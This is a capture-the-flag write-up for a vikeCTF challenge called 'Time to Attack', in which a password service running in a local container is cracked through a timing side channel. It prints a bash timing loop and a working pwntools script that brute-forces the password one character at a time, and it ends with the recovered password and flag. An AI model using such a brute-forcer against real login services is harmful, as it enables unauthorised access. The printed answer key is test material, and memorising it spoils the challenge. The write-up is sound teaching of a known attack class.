# Time to Attack

**Author: [`Kyle Stang`](https://github.com/kylestang)**

**Category: `Misc Medium`**

## Description

Under the cloak of night, a band of Vikings lies in wait amidst the dense foliage bordering a serene village. They huddle in the shadows, their breaths mingling with the chilled air as they keenly observe the settlement's defenses. Torches flicker, casting eerie shadows across the wooden palisades, while the rhythmic beat of guards' footsteps reverberates in the distance. Patiently, the Vikings bide their time, awaiting the opportune moment to unleash their ferocious onslaught upon the unsuspecting village, their anticipation sharpening with each passing heartbeat.

## Organizers

Run the docker container in `src/` and give players the ip address.

## Solution

Connecting to the server, we get the following prompt:
```console
❯ nc localhost 3006
Welcome! Enter password to login:
```

After trying `password` and some other random values, it doesn't seem to do much
beyond tell us the login failed.

Let's write a quick and dirty script to check the timing of each request:
```bash
#!/bin/bash
for i in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    echo $i
    time echo $i | nc localhost 3006
done
```

Looks like most requests take under 0.1 seconds, except for d which takes 0.5s.
```
d
Welcome! Enter password to login: Login failed

real    0m0.523s
user    0m0.000s
sys     0m0.003
```

This might be a timing attack.

Let's write a python script to try each character and add the slowest request
to the password. Asynchronous requests are strongly recommended to speed up
the process. Using `solution.py`, we can find the password in about 2 minutes:

```python
from pwn import *
import time
import multiprocessing

context.log_level = "WARN"

DEFAULT_ADDR = "localhost:3006"
HOST, PORT = (os.getenv("ADDR") or DEFAULT_ADDR).split(":")

password = ""


def attempt(s: int):
    # Add tiny offsets in requests so they don't all run at once
    time.sleep(random.random() * 0.1)
    global password

    s = chr(s)
    c = connect(HOST, PORT)
    c.recvuntil(b"login:")

    guess = password.encode() + s.encode()
    start = time.time_ns()
    c.sendline(guess)
    line = c.recvline()
    end = time.time_ns()
    print(".", end="", flush=True)

    if line.decode().strip() != "Login failed":
        raise Exception(line.decode().strip())

    c.close()
    return end - start, s


# this depends on your network connection, tweak as needed
POOL_SIZE = 20

try:
    while True:
        candidates = []
        with multiprocessing.Pool(POOL_SIZE) as p:
            candidates = p.map(attempt, range(33, 126))
            candidates.sort()
            password += candidates[-1][1]
            print(password)
except Exception as e:
    print(e)
```

Using the password:
```
❯ nc localhost 3006
Welcome! Enter password to login: dxse465r78
Login succesful: vikeCTF{T1MIN6_A77@CK5_4R3_FUN}
```

## Flag

```
vikeCTF{T1MIN6_A77@CK5_4R3_FUN}
```
